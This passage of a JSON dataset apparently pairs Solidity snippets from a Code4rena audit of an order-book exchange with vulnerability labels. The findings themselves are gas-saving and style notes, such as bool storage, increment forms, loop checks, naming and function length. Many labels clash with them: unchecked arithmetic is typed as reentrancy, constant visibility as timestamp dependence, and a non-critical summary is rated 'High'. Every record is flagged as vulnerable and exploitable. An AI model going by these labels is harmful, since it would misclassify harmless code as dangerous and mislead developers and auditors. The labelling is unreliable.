    "title": "<a name=\"GAS-2\"></a>[GAS-2] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (3)*: File: ./contracts/account-manager/AccountManager.sol 19:     mapping(address market => bool) isMarket; File: ./contracts/clob/CLOBManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.157,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n5: import {ICLOB} from \"./ICLOB.sol\";\n\n6: import {ICLOBManager} from \"./ICLOBManager.sol\";\n\n7: import {IAccountManager} from \"../account-manager/IAccountManager.sol\";\n\n8: import {CLOBStorageLib} from \"./types/Book.sol\";\n\n9: import {TransientMakerData, MakerCredit} from \"./types/TransientMakerData.sol\";\n\n10: import {Order, OrderLib, OrderId, OrderIdLib, Side} from \"./types/Order.sol\";\n\n11: import {Book, BookLib, Limit, MarketConfig, MarketSettings} from \"./types/Book.sol\";\n\n14: import {IOperator} from \"contracts/utils/interfaces/IOperator.sol\";\n\n15: import {OperatorRoles} from \"contracts/utils/Operator.sol\";\n\n16: import {OperatorHelperLib} from \"contracts/utils/types/OperatorHelperLib.sol\";\n\n17: import {EventNonceLib as CLOBEventNonce} from \"contracts/utils/types/EventNonce.sol\";\n\n20: import {SafeCastLib} from \"@solady/utils/SafeCastLib.sol\";\n\n21: import {FixedPointMathLib} from \"@solady/utils/FixedPointMathLib.sol\";\n\n22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\n29:     using OrderLib for *;\n\n271:         return OrderIdLib.getOrderId(address(0), _getStorage().metadata().orderIdCounter + 1);\n\n449:             -totalQuoteSent.toInt256(),\n\n455:             account, newOrder.id.unwrap(), -totalQuoteSent.toInt256(), totalBaseReceived.toInt256(), takerFee\n\n479:             -baseSent.toInt256(),\n\n484:             PostFillOrderResult(account, newOrder.id.unwrap(), quoteReceived.toInt256(), -baseSent.toInt256(), takerFee);\n\n501:         if (postAmount + quoteTokenAmountSent + baseTokenAmountReceived == 0) revert ZeroOrder();\n\n507:         uint256 eventNonce = CLOBEventNonce.inc(); // keep stack from blowing\n\n510:             _settleIncomingOrder(ds, account, Side.BUY, quoteTokenAmountSent + postAmount, baseTokenAmountReceived);\n\n517:             -quoteTokenAmountSent.toInt256(),\n\n526:             -quoteTokenAmountSent.toInt256(),\n\n542:         if (postAmount + quoteTokenAmountReceived + baseTokenAmountSent == 0) revert ZeroOrder();\n\n548:         uint256 eventNonce = CLOBEventNonce.inc(); // Keep stack from blowing\n\n551:             _settleIncomingOrder(ds, account, Side.SELL, quoteTokenAmountReceived, baseTokenAmountSent + postAmount);\n\n559:             -baseTokenAmountSent.toInt256(),\n\n568:             -baseTokenAmountSent.toInt256(),\n\n665:             if (quoteTokenDelta + baseTokenDelta == 0) revert ZeroOrder();\n\n696:             quoteTokenDelta -= postAmount.toInt256();\n\n700:             baseTokenDelta -= postAmount.toInt256();\n\n713:             quoteTokenDelta = oldAmountInQuote - newAmountInQuote;\n\n716:                 uint256(ds.metadata().quoteTokenOpenInterest.toInt256() - quoteTokenDelta);\n\n718:             baseTokenDelta = order.amount.toInt256() - amount.toInt256();\n\n721:                 uint256(ds.metadata().baseTokenOpenInterest.toInt256() - baseTokenDelta);\n\n763:             incomingOrder.amount -= currMatch.matchedAmount;\n\n765:             totalQuoteSent += currMatch.quoteDelta;\n\n766:             totalBaseReceived += currMatch.baseDelta;\n\n797:             incomingOrder.amount -= currMatch.matchedAmount;\n\n799:             totalQuoteTokenReceived += currMatch.quoteDelta;\n\n800:             totalBaseTokenSent += currMatch.baseDelta;\n\n819:             matchData.baseDelta = (matchedBase.min(takerOrder.amount) / lotSize) * lotSize;\n\n825:                 (matchedBase.min(ds.getBaseTokenAmount(matchedPrice, takerOrder.amount)) / lotSize) * lotSize;\n\n839:             if (!orderRemoved) ds.metadata().baseTokenOpenInterest -= matchData.baseDelta;\n\n843:             if (!orderRemoved) ds.metadata().quoteTokenOpenInterest -= matchData.quoteDelta;\n\n847:         else makerOrder.amount -= matchData.baseDelta;\n\n908:         for (uint256 i = 0; i < numOrders; i++) {\n\n914:                 continue; // Order may have been matched\n\n924:                 totalQuoteTokenRefunded += quoteTokenRefunded;\n\n927:                 totalBaseTokenRefunded += baseTokenRefunded;\n\n969:             accountManager.debitAccount(maker, address(ds.config().quoteToken), uint256(-quoteTokenDelta));\n\n975:             accountManager.debitAccount(maker, address(ds.config().baseToken), uint256(-baseTokenDelta));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-4\"></a>[GAS-4] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (208)*: File: ./contracts/account-manager/AccountManager.sol 4: import {IAccountManager} from \"./IAccountManager.sol\"; 5: import {ICLOB, MakerCredit} from \"../clob/ICLOB.sol\"; 6: import {Side} from \"../clob/types/Order.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 112,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/account-manager/AccountManager.sol\n\n166:     function deposit(address account, address token, uint256 amount) external virtual onlySenderOrOperator(account, OperatorRoles.SPOT_DEPOSIT) {\n\n172:     function depositFromRouter(address account, address token, uint256 amount) external onlyGTERouter {\n\n178:     function withdraw(address account, address token, uint256 amount) external virtual onlySenderOrOperator(account, OperatorRoles.SPOT_WITHDRAW) {\n\n184:     function withdrawToRouter(address account, address token, uint256 amount) external onlyGTERouter {\n\n194:     function registerMarket(address market) external onlyCLOBManager {\n\n200:     function collectFees(address token, address feeRecipient) external virtual onlyOwnerOrRoles(Roles.FEE_COLLECTOR) returns (uint256 fee) {\n\n211:     function setSpotAccountFeeTier(address account, FeeTiers feeTier) external virtual onlyCLOBManager {\n\n217:     function setSpotAccountFeeTiers(address[] calldata accounts, FeeTiers[] calldata feeTiers) external virtual onlyCLOBManager {\n\n231:     function settleIncomingOrder(ICLOB.SettleParams calldata params) external virtual onlyMarket returns (uint256 takerFee) {\n\n297:     function creditAccount(address account, address token, uint256 amount) external virtual onlyMarket {\n\n302:     function creditAccountNoEvent(address account, address token, uint256 amount) external virtual onlyMarket {\n\n307:     function debitAccount(address account, address token, uint256 amount) external virtual onlyMarket {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (19)*: File: ./contracts/account-manager/AccountManager.sol 166:     function deposit(address account, address token, uint256 amount) external virtual onlySenderOrOperator(account, OperatorRoles.SPOT_DEPOSIT) { 172:     function depositFromRouter(address account, address token, uint256 amount) external onlyGTERouter {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Book.sol\n\n195:             count++;\n\n230:             counter++;\n\n260:             self.metadata().numBids++;\n\n265:             self.metadata().numAsks++;\n\n273:         limit.numOrders++;\n\n290:             self.metadata().numBids--;\n\n294:             self.metadata().numAsks--;\n\n318:         limit.numOrders--;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "<a name=\"GAS-6\"></a>[GAS-6] `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)",
    "description": "Pre-increments and pre-decrements are cheaper. For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k: **Increment:** - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.35,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n230:         for (uint256 i = 0; i < clobs.length; i++) {\n\n243:         for (uint256 i = 0; i < clobs.length; i++) {\n\n256:         for (uint256 i = 0; i < clobs.length; i++) {\n\n279:         for (uint256 i = 0; i < accounts.length; i++) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-8\"></a>[GAS-8] Increments/decrements can be unchecked in for-loops",
    "description": "In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline. [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695) The change would be: - for (uint256 i; i < numIterations; i++) { + for (uint256 i; i < numIterations;) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.288,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n72:     WETH public immutable weth;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Medium",
    "title": "<a name=\"GAS-10\"></a>[GAS-10] WETH address definition can be use directly",
    "description": "WETH is a wrap Ether contract with a specific address in the Ethereum network, giving the option to define it may cause false recognition, it is healthier to define it directly. Advantages of defining a specific contract directly: It saves gas, Prevents incorrect argument definition, Prevents execution on a different chain and re-signature issues,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.086,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 1 | | [NC-2](#NC-2) | Use `string.concat()` or `bytes.concat()` instead of `abi.encodePacked` | 3 | | [NC-3](#NC-3) | `constant`s should be defined rather than using magic numbers | 5 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n151:         if (msg.sender != address(factory)) revert ManagerUnauthorized();\n\n351:         if (args.side == Side.BUY) return _processFillBidOrder(ds, account, newOrder, args);\n\n381:         if (newOrder.isExpired()) revert OrderExpired();\n\n385:         if (args.side == Side.BUY) return _processLimitBidOrder(ds, account, newOrder, args);\n\n398:         if (order.id.unwrap() == 0) revert OrderLib.OrderNotFound();\n\n399:         if (order.owner != account) revert AmendUnauthorized();\n\n400:         if (args.limitOrderType != LimitOrderType.POST_ONLY) revert AmendNonPostOnlyInvalid();\n\n420:         if (totalBaseTokenRefunded > 0) accountManager.creditAccount(account, baseToken, totalBaseTokenRefunded);\n\n421:         if (totalQuoteTokenRefunded > 0) accountManager.creditAccount(account, quoteToken, totalQuoteTokenRefunded);\n\n439:         if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();\n\n440:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n468:         if (quoteReceived == 0 || baseSent == 0) revert ZeroCostTrade();\n\n469:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n501:         if (postAmount + quoteTokenAmountSent + baseTokenAmountReceived == 0) revert ZeroOrder();\n\n542:         if (postAmount + quoteTokenAmountReceived + baseTokenAmountSent == 0) revert ZeroOrder();\n\n594:             if (newOrder.price <= minBidPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n627:             if (newOrder.price >= maxAskPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n665:             if (quoteTokenDelta + baseTokenDelta == 0) revert ZeroOrder();\n\n687:         if (order.side == Side.BUY) quoteTokenDelta = ds.getQuoteTokenAmount(order.price, order.amount).toInt256();\n\n761:             if (currMatch.baseDelta == 0) break;\n\n795:             if (currMatch.baseDelta == 0) break;\n\n831:         if (matchData.baseDelta == 0) return matchData;\n\n839:             if (!orderRemoved) ds.metadata().baseTokenOpenInterest -= matchData.baseDelta;\n\n843:             if (!orderRemoved) ds.metadata().quoteTokenOpenInterest -= matchData.quoteDelta;\n\n846:         if (orderRemoved) ds.removeOrderFromBook(makerOrder);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-4\"></a>[NC-4] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (90)*: File: ./contracts/account-manager/AccountManager.sol 78:         if (!_getAccountStorage().isMarket[msg.sender]) revert MarketUnauthorized(); 84:         if (msg.sender != gteRouter) revert GTERouterUnauthorized();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 54,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Roles.sol\n\n15:     uint256 constant ADMIN_ROLE = 1 << 0; // _ROLE_0\n\n16:     uint256 constant MARKET_CREATOR = 1 << 1; // _ROLE_1\n\n19:     uint256 constant FEE_COLLECTOR = 1 << 2; // _ROLE_2\n\n20:     uint256 constant FEE_TIER_SETTER = 1 << 3; // _ROLE_3\n\n21:     uint256 constant MAX_LIMITS_EXEMPT_SETTER = 1 << 4; // _ROLE_4\n\n24:     uint256 constant TICK_SIZE_SETTER = 1 << 5; // _ROLE_5\n\n25:     uint256 constant MAX_LIMITS_PER_TX_SETTER = 1 << 6; // _ROLE_6\n\n26:     uint256 constant MIN_LIMIT_ORDER_AMOUNT_SETTER = 1 << 7; // _ROLE_7\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-5\"></a>[NC-5] Default Visibility for constants",
    "description": "Some constants are using the default visibility. For readability, consider explicitly declaring them as `internal`. *Instances (28)*: File: ./contracts/account-manager/AccountManager.sol 347:     bytes32 constant ACCOUNT_MANAGER_STORAGE_POSITION = File: ./contracts/clob/CLOBManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.578,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n170:     function initialize(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n182:     function getBaseToken() external view returns (address) {\n\n187:     function getQuoteToken() external view returns (address) {\n\n193:     function getBaseTokenAmount(uint256 price, uint256 quoteAmount) external view returns (uint256) {\n\n199:     function getQuoteTokenAmount(uint256 price, uint256 baseAmount) external view returns (uint256) {\n\n204:     function getMarketConfig() external view returns (MarketConfig memory) {\n\n209:     function getMarketSettings() external view returns (MarketSettings memory) {\n\n214:     function getTickSize() external view returns (uint256) {\n\n219:     function getLotSizeInBase() external view returns (uint256) {\n\n224:     function getOpenInterest() external view returns (uint256 quoteOi, uint256 baseOi) {\n\n229:     function getOrder(uint256 orderId) external view returns (Order memory) {\n\n234:     function getTOB() external view returns (uint256 maxBid, uint256 minAsk) {\n\n239:     function getLimit(uint256 price, Side side) external view returns (Limit memory) {\n\n244:     function getNumBids() external view returns (uint256) {\n\n249:     function getNumAsks() external view returns (uint256) {\n\n254:     function getNextOrders(uint256 startOrderId, uint256 numOrders) external view returns (Order[] memory) {\n\n259:     function getNextBiggestPrice(uint256 price, Side side) external view returns (uint256) {\n\n264:     function getNextSmallestPrice(uint256 price, Side side) external view returns (uint256) {\n\n270:     function getNextOrderId() external view returns (uint256) {\n\n275:     function getEventNonce() external view returns (uint256) {\n\n280:     function getOrdersPaginated(uint256 startPrice, Side side, uint256 pageSize)\n\n295:     function getOrdersPaginated(OrderId startOrderId, uint256 pageSize)\n\n311:     function setMaxLimitsPerTx(uint8 newMaxLimits) external onlyManager {\n\n317:     function setTickSize(uint256 tickSize) external onlyManager {\n\n323:     function setMinLimitOrderAmountInBase(uint256 newMinLimitOrderAmountInBase) external onlyManager {\n\n329:     function setLotSizeInBase(uint256 newLotSizeInBase) external onlyManager {\n\n339:     function postFillOrder(address account, PostFillOrderArgs calldata args)\n\n356:     function postLimitOrder(address account, PostLimitOrderArgs calldata args)\n\n390:     function amend(address account, AmendArgs calldata args)\n\n410:     function cancel(address account, CancelArgs memory args)\n\n574:     function _executeBidLimitOrder(Book storage ds, Order memory newOrder, LimitOrderType limitOrderType)\n\n607:     function _executeAskLimitOrder(Book storage ds, Order memory newOrder, LimitOrderType limitOrderType)\n\n644:     function _processAmend(Book storage ds, Order storage order, AmendArgs calldata args)\n\n674:     function _executeAmendNewOrder(Book storage ds, Order storage order, AmendArgs calldata args)\n\n705:     function _executeAmendAmount(Book storage ds, Order storage order, uint256 amount)\n\n739:     function _matchIncomingBid(Book storage ds, Order memory incomingOrder, bool amountIsBase)\n\n773:     function _matchIncomingAsk(Book storage ds, Order memory incomingOrder, bool amountIsBase)\n\n855:     function _removeExpiredAsk(Book storage ds, Order storage order) internal {\n\n865:     function _removeExpiredBid(Book storage ds, Order storage order) internal {\n\n875:     function _removeNonCompetitiveOrder(Book storage ds, Order storage order) internal {\n\n903:     function _executeCancel(Book storage ds, address account, CancelArgs memory args)\n\n965:     function _settleAmend(Book storage ds, address maker, int256 quoteTokenDelta, int256 baseTokenDelta) internal {\n\n981:     function __CLOB_init(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n989:     function _getStorage() internal pure returns (Book storage) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (240)*: File: ./contracts/account-manager/AccountManager.sol 118:     function initialize(address _owner) external initializer { 127:     function getAccountBalance(address account, address token) external view returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 92,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Order.sol\n\n29: uint32 constant NULL_TIMESTAMP = 0;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-10\"></a>[NC-10] Numeric values having to do with time should use time units for readability",
    "description": "There are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used *Instances (1)*: File: ./contracts/clob/types/Order.sol 29: uint32 constant NULL_TIMESTAMP = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.09,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n151:         if (msg.sender != address(factory)) revert ManagerUnauthorized();\n\n381:         if (newOrder.isExpired()) revert OrderExpired();\n\n398:         if (order.id.unwrap() == 0) revert OrderLib.OrderNotFound();\n\n399:         if (order.owner != account) revert AmendUnauthorized();\n\n400:         if (args.limitOrderType != LimitOrderType.POST_ONLY) revert AmendNonPostOnlyInvalid();\n\n439:         if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();\n\n440:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n468:         if (quoteReceived == 0 || baseSent == 0) revert ZeroCostTrade();\n\n469:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n501:         if (postAmount + quoteTokenAmountSent + baseTokenAmountReceived == 0) revert ZeroOrder();\n\n504:             revert ZeroCostTrade();\n\n542:         if (postAmount + quoteTokenAmountReceived + baseTokenAmountSent == 0) revert ZeroOrder();\n\n545:             revert ZeroCostTrade();\n\n579:             revert PostOnlyOrderWouldFill();\n\n594:             if (newOrder.price <= minBidPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n612:             revert PostOnlyOrderWouldFill();\n\n627:             if (newOrder.price >= maxAskPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n652:             revert AmendInvalid();\n\n665:             if (quoteTokenDelta + baseTokenDelta == 0) revert ZeroOrder();\n\n916:                 revert CancelUnauthorized();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"NC-11\"></a>[NC-11] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (60)*: File: ./contracts/account-manager/AccountManager.sol 78:         if (!_getAccountStorage().isMarket[msg.sender]) revert MarketUnauthorized(); 84:         if (msg.sender != gteRouter) revert GTERouterUnauthorized();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 44,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n28:     mapping(address account => bool) maxLimitWhitelist;\n\n153:         return _getStorage().maxLimitWhitelist[account];\n\n280:             self.maxLimitWhitelist[accounts[i]] = toggles[i];\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-12\"></a>[NC-12] Avoid the use of sensitive terms",
    "description": "Use [alternative variants](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/), e.g. allowlist/denylist instead of whitelist/blacklist *Instances (3)*: File: ./contracts/clob/CLOBManager.sol 28:     mapping(address account => bool) maxLimitWhitelist; 153:         return _getStorage().maxLimitWhitelist[account];",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.241,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Ownable2Step.transferOwnership",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Low Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [L-1](#L-1) | `approve()`/`safeApprove()` may revert if the current approval is not zero | 5 | | [L-2](#L-2) | Use a 2-step ownership transfer pattern | 2 | | [L-3](#L-3) | `decimals()` is not a part of the ERC-20 standard | 2 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] `approve()`/`safeApprove()` may revert if the current approval is not zero",
    "description": "- Some tokens (like the *very popular* USDT) do not work when changing the allowance from an existing non-zero allowance value (it will revert if the current approval is not zero to protect against front-running changes of approvals). These tokens must first be approved for zero and then the actual allowance can be approved. - Furthermore, OZ's implementation of safeApprove would throw an error if an approve is attempted from a non-zero value (`\"SafeERC20: approve from non-zero to non-zero allowance\"`) Set the allowance to zero immediately before each of the existing allowance calls *Instances (5)*: File: ./contracts/router/GTERouter.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.394,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/account-manager/AccountManager.sol\n\n27: contract AccountManager is IAccountManager, Operator, Initializable, OwnableRoles {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] Use a 2-step ownership transfer pattern",
    "description": "Recommend considering implementing a two step process where the owner or admin nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions. *Instances (2)*: File: ./contracts/account-manager/AccountManager.sol 27: contract AccountManager is IAccountManager, Operator, Initializable, OwnableRoles { File: ./contracts/clob/CLOBManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.152,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n174:         uint8 quoteDecimals = IERC20Metadata(quoteToken).decimals();\n\n175:         uint8 baseDecimals = IERC20Metadata(baseToken).decimals();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-3\"></a>[L-3] `decimals()` is not a part of the ERC-20 standard",
